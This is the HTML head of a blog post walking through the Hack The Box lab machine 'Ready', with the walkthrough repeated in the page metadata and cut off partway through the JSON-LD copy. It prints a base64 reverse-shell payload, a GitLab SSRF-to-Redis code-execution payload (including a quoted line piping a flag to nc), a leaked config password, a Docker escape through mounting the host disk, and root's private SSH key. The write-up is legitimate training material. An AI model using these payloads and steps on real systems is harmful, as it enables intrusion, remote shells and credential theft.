<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="pv-cache-enabled" content="false"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="HTB - Ready" /><meta name="author" content="QTranspose" /><meta property="og:locale" content="en_US" /><meta name="description" content="Ready is a vulnerable virtual machine created by bertolis on HackTheBox. In this post, we document a complete walkthrough of pwning this machine. Enumeration Nmap Starting off with the nmap scan, we see that this is a Linux machine running SSH and HTTP services. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 $ nmap-default 10.10.10.220 Nmap scan report for 10.10.10.220 Host is up (0.031s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 5080/tcp open http nginx | http-robots.txt: 53 disallowed entries (15 shown) | / /autocomplete/users /search /api /admin /profile | /dashboard /projects/new /groups/new /groups/*/edit /users /help |_/s/ /snippets/new /snippets/*/edit | http-title: Sign in \xC2\xB7 GitLab |_Requested resource was http://10.10.10.220:5080/users/sign_in |_http-trane-info: Problem with XML parsing of /evox/about Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel The version of the system can be identified by searching for the OpenSSH package information. It appears to be Ubuntu 20.04 (Focal Fossa) according to the page below. https://launchpad.net/ubuntu/+source/openssh/1:8.2p1-4 For the details of the custom nmap commands, check here. HTTP A GitLab login page is found as the index page of the HTTP server, which is shown below. As registration is turned on, an account can be registered to get access to it. After logging in, the version number can be found on the help page, which is 11.4.7. Exploitation GitLab SSRF to RCE A blog post by LiveOverflow is found interesting, which describes how to leverage an SSRF vulnerability in GitLab 11.4.7 to achieve RCE via redis. It involves using IPv6/IPv4 Address Embedding to bypass local address checks and CRLF injection to create new lines to be able to execute command in redis. To do the exploitation, we first need to create a reverse shell payload. It is encoded in base64 to avoid any bad characters since everything is sent in the URL. 1 2 $ echo &quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.75/4444 0&gt;&amp;1&#39;&quot; | base64 YmFzaCAtYyAnYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNzUvNDQ0NCAwPiYxJwo= The reverse shell payload will be: 1 $ echo YmFzaCAtYyAnYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNzUvNDQ0NCAwPiYxJwo= | base64 -d | bash Next, we copy the exploit payload in the blog post. 1 2 3 4 5 6 git://[0:0:0:0:0:ffff:127.0.0.1]:6379/ multi sadd resque:gitlab:queues system_hook_push lpush resque:gitlab:queue:system_hook_push &quot;{\&quot;class\&quot;:\&quot;GitlabShellWorker\&quot;,\&quot;args\&quot;:[\&quot;class_eval\&quot;,\&quot;open(\&#39;| cat /flag | nc 192.168.178.21 1234\&#39;).read\&quot;],\&quot;retry\&quot;:3,\&quot;queue\&quot;:\&quot;system_hook_push\&quot;,\&quot;jid\&quot;:\&quot;ad52abc5641173e217eb2e52\&quot;,\&quot;created_at\&quot;:1513714403.8122594,\&quot;enqueued_at\&quot;:1513714403.8129568}&quot; exec exec We replace the command execution part with our reverse shell payload, and it reads as the following. 1 2 3 4 5 6 git://[0:0:0:0:0:ffff:127.0.0.1]:6379/ multi sadd resque:gitlab:queues system_hook_push lpush resque:gitlab:queue:system_hook_push &quot;{\&quot;class\&quot;:\&quot;GitlabShellWorker\&quot;,\&quot;args\&quot;:[\&quot;class_eval\&quot;,\&quot;open(\&#39;| echo YmFzaCAtYyAnYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNzUvNDQ0NCAwPiYxJwo= | base64 -d | bash \&#39;).read\&quot;],\&quot;retry\&quot;:3,\&quot;queue\&quot;:\&quot;system_hook_push\&quot;,\&quot;jid\&quot;:\&quot;ad52abc5641173e217eb2e52\&quot;,\&quot;created_at\&quot;:1513714403.8122594,\&quot;enqueued_at\&quot;:1513714403.8129568}&quot; exec exec Now that the payload is ready, we will create a new project and choose import project from URL. We use burp to intercept the request, and modify it to include our payload as the following. Before sending the request, we will want to set up our ncat listener so that we can catch the reverse shell. 1 2 3 4 5 6 $ ncat -nlvp 4444 ... git@gitlab:~/gitlab-rails/working$ whoami git Privilege Escalation After running LinPEAS, we know that we are in a docker environment. Also, an interesting directory /opt/backup has been found by the script. In the directory we find three files as below. 1 2 3 4 5 6 git@gitlab:~/gitlab-rails/working$ cd /opt/backup git@gitlab:/opt/backup$ ls -l total 100 -rw-r--r-- 1 root root 872 Dec 7 09:25 docker-compose.yml -rw-r--r-- 1 root root 15092 Dec 1 16:23 gitlab-secrets.json -rw-r--r-- 1 root root 79639 Dec 1 19:20 gitlab.rb In docker-compose.yml, we find that the container is running in privileged mode, which means that it has root access to all devices on the host system. 1 2 3 4 5 git@gitlab:/opt/backup$ cat docker-compose.yml ... privileged: true And previously LinPEAS has shown the disks of the host system. 1 2 3 4 5 [+] Any sd*/disk* disk in /dev? (limit 20) sda sda1 sda2 sda3 But before we can abuse this, we need to pwn root inside the docker container. Fortunately, trying a password reuse with what we find in the same directory is successful, and that’s it. 1 2 3 4 5 6 7 8 9 10 git@gitlab:/opt/backup$ grep -R pass . ... ./gitlab.rb:gitlab_rails[&#39;smtp_password&#39;] = &quot;wW59U!ZKMbG9+*#h&quot; git@gitlab:/opt/backup$ su - Password: root@gitlab:~# whoami root In the results of the mount command, we find something interesting. It indicates that /dev/sda2 may be the host file system. 1 2 3 4 5 6 7 8 9 root@gitlab:~# mount ... /dev/sda2 on /root_pass type ext4 (rw,relatime) /dev/sda2 on /etc/gitlab type ext4 (rw,relatime) /dev/sda2 on /etc/resolv.conf type ext4 (rw,relatime) /dev/sda2 on /etc/hostname type ext4 (rw,relatime) /dev/sda2 on /etc/hosts type ext4 (rw,relatime) We can mount /dev/sda2 to verify it. By doing that, we have found the root.txt we want. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 root@gitlab:~# mkdir -p /mnt/lol root@gitlab:~# mount /dev/sda2 /mnt/lol root@gitlab:~# ls /mnt/lol bin cdrom etc lib lib64 lost+found mnt proc run snap sys usr boot dev home lib32 libx32 media opt root sbin srv tmp var root@gitlab:~# ls -la /mnt/lol/root total 60 drwx------ 10 root root 4096 Dec 7 17:02 . drwxr-xr-x 20 root root 4096 Dec 7 17:44 .. lrwxrwxrwx 1 root root 9 Jul 11 2020 .bash_history -&gt; /dev/null -rw-r--r-- 1 root root 3106 Dec 5 2019 .bashrc drwx------ 2 root root 4096 May 7 2020 .cache drwx------ 3 root root 4096 Jul 11 2020 .config -rw-r--r-- 1 root root 44 Jul 8 2020 .gitconfig drwxr-xr-x 3 root root 4096 May 7 2020 .local lrwxrwxrwx 1 root root 9 Dec 7 17:02 .mysql_history -&gt; /dev/null -rw-r--r-- 1 root root 161 Dec 5 2019 .profile -rw-r--r-- 1 root root 75 Jul 12 2020 .selected_editor drwx------ 2 root root 4096 Dec 7 16:49 .ssh drwxr-xr-x 2 root root 4096 Dec 1 12:28 .vim lrwxrwxrwx 1 root root 9 Dec 7 17:02 .viminfo -&gt; /dev/null drwxr-xr-x 3 root root 4096 Dec 1 12:41 docker-gitlab drwxr-xr-x 10 root root 4096 Jul 9 2020 ready-channel -r-------- 1 root root 33 Jul 8 2020 root.txt drwxr-xr-x 3 root root 4096 May 18 2020 snap To get a root shell, we can download the root ssh key to our machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 root@gitlab:~# cat /mnt/lol/root/.ssh/id_rsa -----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEAvyovfg++zswQT0s4YuKtqxOO6EhG38TR2eUaInSfI1rjH09Q sle1ivGnwAUrroNAK48LE70Io13DIfE9rxcotDviAIhbBOaqMLbLnfnnCNLApjCn 6KkYjWv+9kj9shzPaN1tNQLc2Rg39pn1mteyvUi2pBfA4ItE05F58WpCgh9KNMlf YmlPwjeRaqARlkkCgFcHFGyVxd6Rh4ZHNFjABd8JIl+Yaq/pg7t4qPhsiFsMwntX TBKGe8T4lzyboBNHOh5yUAI3a3Dx3MdoY+qXS/qatKS2Qgh0Ram2LLFxib9hR49W rG87jLNt/6s06z+Mwf7d/oN8SmCiJx3xHgFzbwIDAQABAoIBACeFZC4uuSbtv011 YqHm9TqSH5BcKPLoMO5YVA/dhmz7xErbzfYg9fJUxXaIWyCIGAMpXoPlJ90GbGof Ar6pDgw8+RtdFVwtB/BsSipN2PrU/2kcVApgsyfBtQNb0b85/5NRe9tizR/Axwkf iUxK3bQOTVwdYQ3LHR6US96iNj/KNru1E8WXcsii5F7JiNG8CNgQx3dzve3Jzw5+ lg5bKkywJcG1r4CU/XV7CJH2SEUTmtoEp5LpiA2Bmx9A2ep4AwNr7bd2sBr6x4ab VYYvjQlf79/ANRXUUxMTJ6w4ov572Sp41gA9bmwI/Er2uLTVQ4OEbpLoXDUDC1Cu K4ku7QECgYEA5G3RqH9ptsouNmg2H5xGZbG5oSpyYhFVsDad2E4y1BIZSxMayMXL g7vSV+D/almaACHJgSIrBjY8ZhGMd+kbloPJLRKA9ob8rfxzUvPEWAW81vNqBBi2 3hO044mOPeiqsHM/+RQOW240EszoYKXKqOxzq/SK4bpRtjHsidSJo4ECgYEA1jzy n20X43ybDMrxFdVDbaA8eo+og6zUqx8IlL7czpMBfzg5NLlYcjRa6Li6Sy8KNbE8 kRznKWApgLnzTkvupk/oYSijSliLHifiVkrtEY0nAtlbGlgmbwnW15lwV+d3Ixi1 KNwMyG+HHZqChNkFtXiyoFaDdNeuoTeAyyfwzu8CgYAo4L40ORjh7Sx38A4/eeff Kv7dKItvoUqETkHRA6105ghAtxqD82GIIYRy1YDft0kn3OQCh+rLIcmNOna4vq6B MPQ/bKBHfcCaIiNBJP5uAhjZHpZKRWH0O/KTBXq++XQSP42jNUOceQw4kRLEuOab dDT/ALQZ0Q3uXODHiZFYAQKBgBBPEXU7e88QhEkkBdhQpNJqmVAHMZ/cf1ALi76v DOYY4MtLf2dZGLeQ7r66mUvx58gQlvjBB4Pp0x7+iNwUAbXdbWZADrYxKV4BUUSa bZOheC/KVhoaTcq0KAu/nYLDlxkv31Kd9ccoXlPNmFP+pWWcK5TzIQy7Aos5S2+r ubQ3AoGBAIvvz5yYJBFJshQbVNY4vp55uzRbKZmlJDvy79MaRHdz+eHry97WhPOv aKvV8jR1G+70v4GVye79Kk7TL5uWFDFWzVPwVID9QCYJjuDlLBaFDnUOYFZW52gz vJzok/kcmwcBlGfmRKxlS0O6n9dAiOLY46YdjyS8F8hNPOKX6rCd -----END RSA PRIVATE KEY----- Now we can ssh into the target as root. 1 2 3 4 5 6 7 8 $ xclip -sel clip -o &gt; root $ chmod 600 root $ ssh -i root root@10.10.10.220 ... root@ready:~# whoami root" /><meta property="og:description" content="Ready is a vulnerable virtual machine created by bertolis on HackTheBox. In this post, we document a complete walkthrough of pwning this machine. Enumeration Nmap Starting off with the nmap scan, we see that this is a Linux machine running SSH and HTTP services. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 $ nmap-default 10.10.10.220 Nmap scan report for 10.10.10.220 Host is up (0.031s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 5080/tcp open http nginx | http-robots.txt: 53 disallowed entries (15 shown) | / /autocomplete/users /search /api /admin /profile | /dashboard /projects/new /groups/new /groups/*/edit /users /help |_/s/ /snippets/new /snippets/*/edit | http-title: Sign in \xC2\xB7 GitLab |_Requested resource was http://10.10.10.220:5080/users/sign_in |_http-trane-info: Problem with XML parsing of /evox/about Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel The version of the system can be identified by searching for the OpenSSH package information. It appears to be Ubuntu 20.04 (Focal Fossa) according to the page below. https://launchpad.net/ubuntu/+source/openssh/1:8.2p1-4 For the details of the custom nmap commands, check here. HTTP A GitLab login page is found as the index page of the HTTP server, which is shown below. As registration is turned on, an account can be registered to get access to it. After logging in, the version number can be found on the help page, which is 11.4.7. Exploitation GitLab SSRF to RCE A blog post by LiveOverflow is found interesting, which describes how to leverage an SSRF vulnerability in GitLab 11.4.7 to achieve RCE via redis. It involves using IPv6/IPv4 Address Embedding to bypass local address checks and CRLF injection to create new lines to be able to execute command in redis. To do the exploitation, we first need to create a reverse shell payload. It is encoded in base64 to avoid any bad characters since everything is sent in the URL. 1 2 $ echo &quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.75/4444 0&gt;&amp;1&#39;&quot; | base64 YmFzaCAtYyAnYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNzUvNDQ0NCAwPiYxJwo= The reverse shell payload will be: 1 $ echo YmFzaCAtYyAnYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNzUvNDQ0NCAwPiYxJwo= | base64 -d | bash Next, we copy the exploit payload in the blog post. 1 2 3 4 5 6 git://[0:0:0:0:0:ffff:127.0.0.1]:6379/ multi sadd resque:gitlab:queues system_hook_push lpush resque:gitlab:queue:system_hook_push &quot;{\&quot;class\&quot;:\&quot;GitlabShellWorker\&quot;,\&quot;args\&quot;:[\&quot;class_eval\&quot;,\&quot;open(\&#39;| cat /flag | nc 192.168.178.21 1234\&#39;).read\&quot;],\&quot;retry\&quot;:3,\&quot;queue\&quot;:\&quot;system_hook_push\&quot;,\&quot;jid\&quot;:\&quot;ad52abc5641173e217eb2e52\&quot;,\&quot;created_at\&quot;:1513714403.8122594,\&quot;enqueued_at\&quot;:1513714403.8129568}&quot; exec exec We replace the command execution part with our reverse shell payload, and it reads as the following. 1 2 3 4 5 6 git://[0:0:0:0:0:ffff:127.0.0.1]:6379/ multi sadd resque:gitlab:queues system_hook_push lpush resque:gitlab:queue:system_hook_push &quot;{\&quot;class\&quot;:\&quot;GitlabShellWorker\&quot;,\&quot;args\&quot;:[\&quot;class_eval\&quot;,\&quot;open(\&#39;| echo YmFzaCAtYyAnYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNzUvNDQ0NCAwPiYxJwo= | base64 -d | bash \&#39;).read\&quot;],\&quot;retry\&quot;:3,\&quot;queue\&quot;:\&quot;system_hook_push\&quot;,\&quot;jid\&quot;:\&quot;ad52abc5641173e217eb2e52\&quot;,\&quot;created_at\&quot;:1513714403.8122594,\&quot;enqueued_at\&quot;:1513714403.8129568}&quot; exec exec Now that the payload is ready, we will create a new project and choose import project from URL. We use burp to intercept the request, and modify it to include our payload as the following. Before sending the request, we will want to set up our ncat listener so that we can catch the reverse shell. 1 2 3 4 5 6 $ ncat -nlvp 4444 ... git@gitlab:~/gitlab-rails/working$ whoami git Privilege Escalation After running LinPEAS, we know that we are in a docker environment. Also, an interesting directory /opt/backup has been found by the script. In the directory we find three files as below. 1 2 3 4 5 6 git@gitlab:~/gitlab-rails/working$ cd /opt/backup git@gitlab:/opt/backup$ ls -l total 100 -rw-r--r-- 1 root root 872 Dec 7 09:25 docker-compose.yml -rw-r--r-- 1 root root 15092 Dec 1 16:23 gitlab-secrets.json -rw-r--r-- 1 root root 79639 Dec 1 19:20 gitlab.rb In docker-compose.yml, we find that the container is running in privileged mode, which means that it has root access to all devices on the host system. 1 2 3 4 5 git@gitlab:/opt/backup$ cat docker-compose.yml ... privileged: true And previously LinPEAS has shown the disks of the host system. 1 2 3 4 5 [+] Any sd*/disk* disk in /dev? (limit 20) sda sda1 sda2 sda3 But before we can abuse this, we need to pwn root inside the docker container. Fortunately, trying a password reuse with what we find in the same directory is successful, and that’s it. 1 2 3 4 5 6 7 8 9 10 git@gitlab:/opt/backup$ grep -R pass . ... ./gitlab.rb:gitlab_rails[&#39;smtp_password&#39;] = &quot;wW59U!ZKMbG9+*#h&quot; git@gitlab:/opt/backup$ su - Password: root@gitlab:~# whoami root In the results of the mount command, we find something interesting. It indicates that /dev/sda2 may be the host file system. 1 2 3 4 5 6 7 8 9 root@gitlab:~# mount ... /dev/sda2 on /root_pass type ext4 (rw,relatime) /dev/sda2 on /etc/gitlab type ext4 (rw,relatime) /dev/sda2 on /etc/resolv.conf type ext4 (rw,relatime) /dev/sda2 on /etc/hostname type ext4 (rw,relatime) /dev/sda2 on /etc/hosts type ext4 (rw,relatime) We can mount /dev/sda2 to verify it. By doing that, we have found the root.txt we want. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 root@gitlab:~# mkdir -p /mnt/lol root@gitlab:~# mount /dev/sda2 /mnt/lol root@gitlab:~# ls /mnt/lol bin cdrom etc lib lib64 lost+found mnt proc run snap sys usr boot dev home lib32 libx32 media opt root sbin srv tmp var root@gitlab:~# ls -la /mnt/lol/root total 60 drwx------ 10 root root 4096 Dec 7 17:02 . drwxr-xr-x 20 root root 4096 Dec 7 17:44 .. lrwxrwxrwx 1 root root 9 Jul 11 2020 .bash_history -&gt; /dev/null -rw-r--r-- 1 root root 3106 Dec 5 2019 .bashrc drwx------ 2 root root 4096 May 7 2020 .cache drwx------ 3 root root 4096 Jul 11 2020 .config -rw-r--r-- 1 root root 44 Jul 8 2020 .gitconfig drwxr-xr-x 3 root root 4096 May 7 2020 .local lrwxrwxrwx 1 root root 9 Dec 7 17:02 .mysql_history -&gt; /dev/null -rw-r--r-- 1 root root 161 Dec 5 2019 .profile -rw-r--r-- 1 root root 75 Jul 12 2020 .selected_editor drwx------ 2 root root 4096 Dec 7 16:49 .ssh drwxr-xr-x 2 root root 4096 Dec 1 12:28 .vim lrwxrwxrwx 1 root root 9 Dec 7 17:02 .viminfo -&gt; /dev/null drwxr-xr-x 3 root root 4096 Dec 1 12:41 docker-gitlab drwxr-xr-x 10 root root 4096 Jul 9 2020 ready-channel -r-------- 1 root root 33 Jul 8 2020 root.txt drwxr-xr-x 3 root root 4096 May 18 2020 snap To get a root shell, we can download the root ssh key to our machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 root@gitlab:~# cat /mnt/lol/root/.ssh/id_rsa -----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEAvyovfg++zswQT0s4YuKtqxOO6EhG38TR2eUaInSfI1rjH09Q sle1ivGnwAUrroNAK48LE70Io13DIfE9rxcotDviAIhbBOaqMLbLnfnnCNLApjCn 6KkYjWv+9kj9shzPaN1tNQLc2Rg39pn1mteyvUi2pBfA4ItE05F58WpCgh9KNMlf YmlPwjeRaqARlkkCgFcHFGyVxd6Rh4ZHNFjABd8JIl+Yaq/pg7t4qPhsiFsMwntX TBKGe8T4lzyboBNHOh5yUAI3a3Dx3MdoY+qXS/qatKS2Qgh0Ram2LLFxib9hR49W rG87jLNt/6s06z+Mwf7d/oN8SmCiJx3xHgFzbwIDAQABAoIBACeFZC4uuSbtv011 YqHm9TqSH5BcKPLoMO5YVA/dhmz7xErbzfYg9fJUxXaIWyCIGAMpXoPlJ90GbGof Ar6pDgw8+RtdFVwtB/BsSipN2PrU/2kcVApgsyfBtQNb0b85/5NRe9tizR/Axwkf iUxK3bQOTVwdYQ3LHR6US96iNj/KNru1E8WXcsii5F7JiNG8CNgQx3dzve3Jzw5+ lg5bKkywJcG1r4CU/XV7CJH2SEUTmtoEp5LpiA2Bmx9A2ep4AwNr7bd2sBr6x4ab VYYvjQlf79/ANRXUUxMTJ6w4ov572Sp41gA9bmwI/Er2uLTVQ4OEbpLoXDUDC1Cu K4ku7QECgYEA5G3RqH9ptsouNmg2H5xGZbG5oSpyYhFVsDad2E4y1BIZSxMayMXL g7vSV+D/almaACHJgSIrBjY8ZhGMd+kbloPJLRKA9ob8rfxzUvPEWAW81vNqBBi2 3hO044mOPeiqsHM/+RQOW240EszoYKXKqOxzq/SK4bpRtjHsidSJo4ECgYEA1jzy n20X43ybDMrxFdVDbaA8eo+og6zUqx8IlL7czpMBfzg5NLlYcjRa6Li6Sy8KNbE8 kRznKWApgLnzTkvupk/oYSijSliLHifiVkrtEY0nAtlbGlgmbwnW15lwV+d3Ixi1 KNwMyG+HHZqChNkFtXiyoFaDdNeuoTeAyyfwzu8CgYAo4L40ORjh7Sx38A4/eeff Kv7dKItvoUqETkHRA6105ghAtxqD82GIIYRy1YDft0kn3OQCh+rLIcmNOna4vq6B MPQ/bKBHfcCaIiNBJP5uAhjZHpZKRWH0O/KTBXq++XQSP42jNUOceQw4kRLEuOab dDT/ALQZ0Q3uXODHiZFYAQKBgBBPEXU7e88QhEkkBdhQpNJqmVAHMZ/cf1ALi76v DOYY4MtLf2dZGLeQ7r66mUvx58gQlvjBB4Pp0x7+iNwUAbXdbWZADrYxKV4BUUSa bZOheC/KVhoaTcq0KAu/nYLDlxkv31Kd9ccoXlPNmFP+pWWcK5TzIQy7Aos5S2+r ubQ3AoGBAIvvz5yYJBFJshQbVNY4vp55uzRbKZmlJDvy79MaRHdz+eHry97WhPOv aKvV8jR1G+70v4GVye79Kk7TL5uWFDFWzVPwVID9QCYJjuDlLBaFDnUOYFZW52gz vJzok/kcmwcBlGfmRKxlS0O6n9dAiOLY46YdjyS8F8hNPOKX6rCd -----END RSA PRIVATE KEY----- Now we can ssh into the target as root. 1 2 3 4 5 6 7 8 $ xclip -sel clip -o &gt; root $ chmod 600 root $ ssh -i root root@10.10.10.220 ... root@ready:~# whoami root" /><link rel="canonical" href="https://qtranspose.xyz/posts/htb-ready/" /><meta property="og:url" content="https://qtranspose.xyz/posts/htb-ready/" /><meta property="og:site_name" content="QTranspose" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-05-16T00:00:00+10:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HTB - Ready" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@QTranspose" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"Ready is a vulnerable virtual machine created by bertolis on HackTheBox. In this post, we document a complete walkthrough of pwning this machine. Enumeration Nmap Starting off with the nmap scan, we see that this is a Linux machine running SSH and HTTP services. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 $ nmap-default 10.10.10.220 Nmap scan report for 10.10.10.220 Host is up (0.031s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 5080/tcp open http nginx | http-robots.txt: 53 disallowed entries (15 shown) | / /autocomplete/users /search /api /admin /profile | /dashboard /projects/new /groups/new /groups/*/edit /users /help |_/s/ /snippets/new /snippets/*/edit | http-title: Sign in \\xC2\\xB7 GitLab |_Requested resource was http://10.10.10.220:5080/users/sign_in |_http-trane-info: Problem with XML parsing of /evox/about Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel The version of the system can be identified by searching for the OpenSSH package information. It appears to be Ubuntu 20.04 (Focal Fossa) according to the page below. https://launchpad.net/ubuntu/+source/openssh/1:8.2p1-4 For the details of the custom nmap commands, check here. HTTP A GitLab login page is found as the index page of the HTTP server, which is shown below. As registration is turned on, an account can be registered to get access to it. After logging in, the version number can be found on the help page, which is 11.4.7. Exploitation GitLab SSRF to RCE A blog post by LiveOverflow is found interesting, which describes how to leverage an SSRF vulnerability in GitLab 11.4.7 to achieve RCE via redis. It involves using IPv6/IPv4 Address Embedding to bypass local address checks and CRLF injection to create new lines to be able to execute command in redis. To do the exploitation, we first need to create a reverse shell payload. It is encoded in base64 to avoid any bad characters since everything is sent in the URL. 1 2 $ echo &quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.75/4444 0&gt;&amp;1&#39;&quot; | base64 YmFzaCAtYyAnYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNzUvNDQ0NCAwPiYxJwo= The reverse shell payload will be: 1 $ echo YmFzaCAtYyAnYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNzUvNDQ0NCAwPiYxJwo= | base64 -d | bash Next, we copy the exploit payload in the blog post. 1 2 3 4 5 6 git://[0:0:0:0:0:ffff:127.0.0.1]:6379/ multi sadd resque:gitlab:queues system_hook_push lpush resque:gitlab:queue:system_hook_push &quot;{\\&quot;class\\&quot;:\\&quot;GitlabShellWorker\\&quot;,\\&quot;args\\&quot;:[\\&quot;class_eval\\&quot;,\\&quot;open(\\&#39;| cat /flag | nc 192.168.178.21 1234\\&#39;).read\\&quot;],\\&quot;retry\\&quot;:3,\\&quot;queue\\&quot;:\\&quot;system_hook_push\\&quot;,\\&quot;jid\\&quot;:\\&quot;ad52abc5641173e217eb2e52\\&quot;,\\&quot;created_at\\&quot;:1513714403.8122594,\\&quot;enqueued_at\\&quot;:1513714403.8129568}&quot; exec exec We replace the command execution part with our reverse shell payload, and it reads as the following. 1 2 3 4 5 6 git://[0:0:0:0:0:ffff:127.0.0.1]:6379/ multi sadd resque:gitlab:queues system_hook_push lpush resque:gitlab:queue:system_hook_push &quot;{\\&quot;class\\&quot;:\\&quot;GitlabShellWorker\\&quot;,\\&quot;args\\&quot;:[\\&quot;class_eval\\&quot;,\\&quot;open(\\&#39;| echo YmFzaCAtYyAnYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNzUvNDQ0NCAwPiYxJwo= | base64 -d | bash \\&#39;).read\\&quot;],\\&quot;retry\\&quot;:3,\\&quot;queue\\&quot;:\\&quot;system_hook_push\\&quot;,\\&quot;jid\\&quot;:\\&quot;ad52abc5641173e217eb2e52\\&quot;,\\&quot;created_at\\&quot;:1513714403.8122594,\\&quot;enqueued_at\\&quot;:1513714403.8129568}&quot; exec exec Now that the payload is ready, we will create a new project and choose import project from URL. We use burp to intercept the request, and modify it to include our payload as the following. Before sending the request, we will want to set up our ncat listener so that we can catch the reverse shell. 1 2 3 4 5 6 $ ncat -nlvp 4444 ... git@gitlab:~/gitlab-rails/working$ whoami git Privilege Escalation After running LinPEAS, we know that we are in a docker environment. Also, an interesting directory /opt/backup has been found by the script. In the directory we find three files as below. 1 2 3 4 5 6 git@gitlab:~/gitlab-rails/working$ cd /opt/backup git@gitlab:/opt/backup$ ls -l total 100 -rw-r--r-- 1 root root 872 Dec 7 09:25 docker-compose.yml -rw-r--r-- 1 root root 15092 Dec 1 16:23 gitlab-secrets.json -rw-r--r-- 1 root root 79639 Dec 1 19:20 gitlab.rb In docker-compose.yml, we find that the container is running in privileged mode, which means that it has root access to all devices on the host system. 1 2 3 4 5 git@gitlab:/opt/backup$ cat docker-compose.yml ... privileged: true And previously LinPEAS has shown the disks of the host system. 1 2 3 4 5 [+] Any sd*/disk* disk in /dev? (limit 20) sda sda1 sda2 sda3 But before we can abuse this, we need to pwn root inside the docker container. Fortunately, trying a password reuse with what we find in the same directory is successful, and that’s it. 1 2 3 4 5 6 7 8 9 10 git@gitlab:/opt/backup$ grep -R pass . ... ./gitlab.rb:gitlab_rails[&#39;smtp_password&#39;] = &quot;wW59U!ZKMbG9+*#h&quot; git@gitlab:/opt/backup$ su - Password: root@gitlab:~# whoami root In the results of the mount command, we find something interesting. It indicates that /dev/sda2 may be the host file system. 1 2 3 4 5 6 7 8 9 root@gitlab:~# mount ... /dev/sda2 on /root_pass type ext4 (rw,relatime) /dev/sda2 on /etc/gitlab type ext4 (rw,relatime) /dev/sda2 on /etc/resolv.conf type ext4 (rw,relatime) /dev/sda2 on /etc/hostname type ext4 (rw,relatime) /dev/sda2 on /etc/hosts type ext4 (rw,relatime) We can mount /dev/sda2 to verify it. By doing that, we have found the root.txt we want. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 root@gitlab:~# mkdir -p /mnt/lol root@gitlab:~# mount /dev/sda2 /mnt/lol root@gitlab:~# ls /mnt/lol bin cdrom etc lib lib64 lost+found mnt proc run snap sys usr boot dev home lib32 libx32 media opt root sbin srv tmp var root@gitlab:~# ls -la /mnt/lol/root total 60 drwx------ 10 root root 4096 Dec 7 17:02 . drwxr-xr-x 20 root root 4096 Dec 7 17:44 .. lrwxrwxrwx 1 root root 9 Jul 11 2020 .bash_history -&gt; /dev/null -rw-r--r-- 1 root root 3106 Dec 5 2019 .bashrc drwx------ 2 root root 4096 May 7 2020 .cache drwx------ 3 root root 4096 Jul 11 2020 .config -rw-r--r-- 1 root root 44 Jul 8 2020 .gitconfig drwxr-xr-x 3 root root 4096 May 7 2020 .local lrwxrwxrwx 1 root root 9 Dec 7 17:02 .mysql_history -&gt; /dev/null -rw-r--r-- 1 root root 161 Dec 5 2019 .profile -rw-r--r-- 1 root root 75 Jul 